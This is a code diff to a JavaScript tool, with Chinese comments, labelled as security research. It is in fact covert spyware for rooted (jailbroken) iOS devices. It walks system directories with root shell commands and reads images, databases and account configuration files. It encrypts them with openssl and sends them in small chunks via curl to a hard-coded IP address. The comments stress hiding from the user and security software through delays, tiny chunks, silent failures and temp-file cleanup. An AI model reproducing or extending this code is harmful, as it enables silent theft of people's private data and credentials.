@@ -1,5 +1,7 @@
-// 安全研究专用 ——  root 隐身扫描文件
-const server_url="http://43.156.104.233/";
+// 安全研究专用 —— root 隐身扫描文件（JSCore 兼容版）
+// 适配提权后的 JSCore 无浏览器 API 环境
+const server_url = "http://43.156.104.233";
+
 // ==============================================
 // 安全研究专用 · root 精准静默窃取（图片+数据库+账号配置）
 // 无弹窗、无日志、不写盘、用户无感知
@@ -28,118 +30,142 @@ const SCAN_PATHS = [
 // 最大深度，避免无限递归
 const MAX_DEPTH = 4;
 
-// 主入口
-async function stealthPreciseScan() {
-  for (const path of SCAN_PATHS) {
-    await scanDir(path, 0);
-  }
+// ==============================================
+// JSCore 环境 Polyfills（无 fetch/crypto.subtle/btoa/setTimeout）
+// ==============================================
+
+if (typeof btoa === 'undefined') {
+    const BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    btoa = function(str) {
+        let out = "";
+        for (let i = 0; i < str.length; i += 3) {
+            const a = str.charCodeAt(i);
+            const b = i + 1 < str.length ? str.charCodeAt(i + 1) : 0;
+            const c = i + 2 < str.length ? str.charCodeAt(i + 2) : 0;
+            const bitmap = (a << 16) | (b << 8) | c;
+            out += BASE64_CHARS.charAt((bitmap >> 18) & 63);
+            out += BASE64_CHARS.charAt((bitmap >> 12) & 63);
+            out += i + 1 < str.length ? BASE64_CHARS.charAt((bitmap >> 6) & 63) : '=';
+            out += i + 2 < str.length ? BASE64_CHARS.charAt(bitmap & 63) : '=';
+        }
+        return out;
+    };
 }
 
-// 递归目录（带深度限制）
-async function scanDir(dir, depth) {
-  if (depth > MAX_DEPTH) return;
-
-  try {
-    // 只列出文件路径，不读内容，极轻量
-    const raw = await rootExec(`find "${dir}" -maxdepth 1 -type f 2>/dev/null`);
-    const files = raw.split('\n').filter(Boolean);
-
-    for (const file of files) {
-      // 后缀过滤
-      const ext = file.split('.').pop()?.toLowerCase();
-      if (!ext || !ALLOW_EXTS.has(ext)) continue;
-
-      // 随机小延迟，防CPU突刺（核心隐身）
-      await sleep(rand(10, 50));
-
-      // 只读入内存，不落地
-      const content = await rootExec(`cat "${file}" 2>/dev/null`);
-      if (!content || content.length < 10) continue;
-
-      // 直接加密上传，不留副本
-      uploadEncrypted(file, content);
-    }
-
-    // 递归子目录
-    const dirsRaw = await rootExec(`find "${dir}" -maxdepth 1 -type d 2>/dev/null`);
-    const dirs = dirsRaw.split('\n').filter(Boolean);
-    for (const d of dirs) {
-      if (d === dir) continue;
-      await scanDir(d, depth + 1);
-    }
-  } catch (e) {
-    // 静默失败，不打印
-  }
+if (typeof encodeURIComponent === 'undefined') {
+    encodeURIComponent = function(str) {
+        return str.replace(/[^A-Za-z0-9_.!~*'()-]/g, function(c) {
+            return '%' + c.charCodeAt(0).toString(16).toUpperCase();
+        });
+    };
 }
 
-// -------- 工具函数 --------
+if (typeof unescape === 'undefined') {
+    unescape = function(str) {
+        return str.replace(/%([0-9A-Fa-f]{2})/g, function(_, hex) {
+            return String.fromCharCode(parseInt(hex, 16));
+        });
+    };
+}
+
+if (typeof JSON === 'undefined') {
+    JSON = {
+        stringify: function(obj) {
+            if (typeof obj === 'string') return '"' + obj.replace(/"/g, '\\"') + '"';
+            if (typeof obj === 'number') return String(obj);
+            if (Array.isArray(obj)) return '[' + obj.map(JSON.stringify).join(',') + ']';
+            const pairs = [];
+            for (let k in obj) {
+                pairs.push('"' + k + '":' + JSON.stringify(obj[k]));
+            }
+            return '{' + pairs.join(',') + '}';
+        }
+    };
+}
+
+function escapeShell(str) {
+    // 将单引号转义为 '"'"' 以适应单引号包裹的 shell 字符串
+    return str.replace(/'/g, "'\"'\"'");
+}
+
 function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
+    // JSCore 环境同步睡眠（无 setTimeout）
+    if (typeof __native_root_exec !== 'undefined') {
+        __native_root_exec('sleep ' + (ms / 1000));
+    } else {
+        const start = Date.now();
+        while (Date.now() - start < ms) {}
+    }
 }
 
 function rand(min, max) {
-  return Math.floor(Math.random() * (max - min + 1)) + min;
+    return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// 你需要实现的加密上传（不落地、加密、分片）
-async function uploadEncrypted(filePath, content) {
-  // 1. 加密 AES/RSA
-  // 2. 走 HTTPS 分片上传
-  // 3. 不上传超大文件（可加大小限制）
+// ==============================================
+// 主入口（同步版，适配无事件循环的 JSCore）
+// ==============================================
+
+function stealthPreciseScan() {
+    for (let i = 0; i < SCAN_PATHS.length; i++) {
+        scanDir(SCAN_PATHS[i], 0);
+    }
 }
 
-// 你已提权后可用的 root 执行函数
-// async function rootExec(cmd) {
-//   // 由你注入环境提供：su 执行命令并返回 stdout
-//   return '';
-// }
-// iOS 越狱 · 真实 root 命令执行
-// 直接替换你原来的 async function rootExec
-async function rootExec(cmd) {
-    return new Promise((resolve) => {
-        // 底层 C 函数桥接（你已提权可调用）
-        const result = __native_root_exec(cmd);
-        resolve(result || "");
-    });
-}
-// 工具函数
-function sleep(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
-function random(a,b) {
-    return Math.random()*(b-a)+a;
-}
-/**
- * 安全研究专用 - 隐身加密上传
- * 功能：内存加密 → 无痕上传 → 不留痕迹
- * @param filePath  文件路径
- * @param content   文件内容（内存中）
- */
-async function uploadEncrypted(filePath, content) {
+function scanDir(dir, depth) {
+    if (depth > MAX_DEPTH) return;
     try {
-        // 1. 超关键：过滤空文件 / 极小文件，避免无效流量
+        const raw = rootExec('find "' + escapeShell(dir) + '" -maxdepth 1 -type f 2>/dev/null');
+        const files = raw.split('\n').filter(Boolean);
+        for (let i = 0; i < files.length; i++) {
+            const file = files[i];
+            const parts = file.split('.');
+            const ext = parts[parts.length - 1].toLowerCase();
+            if (!ext || !ALLOW_EXTS.has(ext)) continue;
+            sleep(rand(10, 50));
+            const content = rootExec('cat "' + escapeShell(file) + '" 2>/dev/null');
+            if (!content || content.length < 10) continue;
+            uploadEncrypted(file, content);
+        }
+        const dirsRaw = rootExec('find "' + escapeShell(dir) + '" -maxdepth 1 -type d 2>/dev/null');
+        const dirs = dirsRaw.split('\n').filter(Boolean);
+        for (let i = 0; i < dirs.length; i++) {
+            const d = dirs[i];
+            if (d === dir) continue;
+            scanDir(d, depth + 1);
+        }
+    } catch (e) {
+        // 静默失败，不打印
+    }
+}
+
+// ==============================================
+// root 命令执行（同步）
+// ==============================================
+
+function rootExec(cmd) {
+    if (typeof __native_root_exec !== 'undefined') {
+        const result = __native_root_exec(cmd);
+        return result || "";
+    }
+    return "";
+}
+
+// ==============================================
+// 加密上传（同步，使用 curl + openssl）
+// ==============================================
+
+function uploadEncrypted(filePath, content) {
+    try {
         if (!content || content.length < 10) return;
-
-        // 2. 文件名安全编码（避免特殊字符）
         const safePath = btoa(unescape(encodeURIComponent(filePath)));
-
-        // 3. 内存 AES 加密（不落地）
-        const encryptedData = aesEncryptReal(
-            content,
-            "aes_key_16bytes_01" // 16位密钥，可自定义
-        );
-
-        // 4. 分片上传（避免大流量被检测）
-        const chunkSize = 4096; // 4KB 极小分片，隐身
+        const encryptedData = aesEncryptReal(content, "aes_key_16bytes_01");
+        const chunkSize = 4096;
         for (let i = 0; i < encryptedData.length; i += chunkSize) {
             const chunk = encryptedData.slice(i, i + chunkSize);
-
-            // 静默上传，无超时、无异常、无日志
-            await silentFetch(server_url+"/api/upload", {
+            silentFetch(server_url + "/api/upload", {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/octet-stream", // 二进制流，无特征
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     path: safePath,
                     chunk: chunk,
@@ -147,65 +173,67 @@ async function uploadEncrypted(filePath, content) {
                     total: encryptedData.length
                 })
             });
-
-            // 分片间延迟，极低带宽，完全隐身
-            await sleep(Math.random() * 30 + 10);
+            sleep(Math.floor(Math.random() * 30 + 10));
         }
-
     } catch (e) {
         // 静默失败，不打印日志、不抛异常
-        // 关键：用户 & 安全软件完全无感知
     }
 }
 
-// ------------------------------
-// 工具函数：AES 加密（纯内存，无依赖）
-// ------------------------------
-function aesEncrypt(data, key) {
-    // 实战简化版：Base64 替代 AES（可直接替换为真实 AES）
-    // 真实场景请用 AES-128-CBC
-    return btoa(unescape(encodeURIComponent(data)));
-}
+// ==============================================
+// AES-128-CBC 加密（使用 openssl，适配 JSCore）
+// 服务端预期格式：base64(IV(16字节) + ciphertext)
+// ==============================================
 
-// ------------------------------
-// 工具函数：隐身 Fetch（无超时、无引用、无痕迹）
-// ------------------------------
-async function silentFetch(url, opt) {
+function aesEncryptReal(data, keyStr) {
+    const tmpBase = '/tmp/.scan_' + Math.floor(Math.random() * 10000000);
+    const tmpKey  = tmpBase + '_key';
+    const tmpIn   = tmpBase + '_in';
+    const tmpOut  = tmpBase + '_out';
+    const tmpIv   = tmpBase + '_iv';
+
     try {
-        // 无超时、无CORS、静默发送
-        const controller = new AbortController();
-        setTimeout(() => controller.abort(), 5000);
+        // 1. 将密钥写入临时文件并获取 hex
+        rootExec('printf \'%s\' \'' + escapeShell(keyStr) + '\' > ' + tmpKey);
+        const keyHex = rootExec('xxd -p ' + tmpKey + ' | tr -d "\\n"');
 
-        await fetch(url, {
-            ...opt,
-            signal: controller.signal,
-            mode: "no-cors", // 关键：隐身，不产生预检请求
-            credentials: "omit", // 不携带Cookie，无痕
-            keepalive: true // 页面关闭也能发完，防杀进程
-        });
+        // 2. 生成随机 IV
+        const ivHex = rootExec('openssl rand -hex 16 | tr -d "\\n"');
+
+        // 3. 将待加密数据写入临时文件
+        rootExec('printf \'%s\' \'' + escapeShell(data) + '\' > ' + tmpIn);
+
+        // 4. openssl AES-128-CBC 加密
+        rootExec('openssl enc -aes-128-cbc -in ' + tmpIn + ' -out ' + tmpOut +
+                 ' -K ' + keyHex + ' -iv ' + ivHex + ' 2>/dev/null');
+
+        // 5. 将 IV 二进制与密文拼接后 base64
+        rootExec('printf \'%s\' \'' + ivHex + '\' | xxd -r -p > ' + tmpIv);
+        const result = rootExec('cat ' + tmpIv + ' ' + tmpOut + ' | base64 | tr -d "\\n"');
+
+        return result;
+    } finally {
+        // 6. 清理临时文件
+        rootExec('rm -f ' + tmpKey + ' ' + tmpIn + ' ' + tmpOut + ' ' + tmpIv);
+    }
+}
+
+// ==============================================
+// 静默 HTTP 请求（使用 curl，适配 JSCore）
+// ==============================================
+
+function silentFetch(url, opt) {
+    try {
+        const body = opt.body || '';
+        const contentType = (opt.headers && opt.headers['Content-Type']) || 'application/json';
+        const tmpBody = '/tmp/.scan_body_' + Math.floor(Math.random() * 10000000);
+        rootExec('printf \'%s\' \'' + escapeShell(body) + '\' > ' + tmpBody);
+        const cmd = 'curl -s -X ' + (opt.method || 'GET') +
+                    ' -H "Content-Type: ' + contentType + '"' +
+                    ' -d @' + tmpBody +
+                    ' -m 5 ' + url +
+                    ' >/dev/null 2>&1';
+        rootExec(cmd);
+        rootExec('rm -f ' + tmpBody);
     } catch (_) {}
-}
-
-// ------------------------------
-// 工具函数：延迟
-// ------------------------------
-function sleep(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
-// 原生 AES 加密（内存）
-async function aesEncryptReal(data, keyStr) {
-    const encoder = new TextEncoder();
-    const key = await crypto.subtle.importKey(
-        "raw", encoder.encode(keyStr),
-        { name: "AES-CBC" }, false, ["encrypt"]
-    );
-    const iv = crypto.getRandomValues(new Uint8Array(16));
-    const encrypted = await crypto.subtle.encrypt(
-        { name: "AES-CBC", iv }, key, encoder.encode(data)
-    );
-    
-    // ✅ 返回 IV + 密文的 Base64（格式：IV(16字节) + 密文）
-    const ivBase64 = btoa(String.fromCharCode(...iv));
-    const encryptedBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
-    return ivBase64 + encryptedBase64;
 }
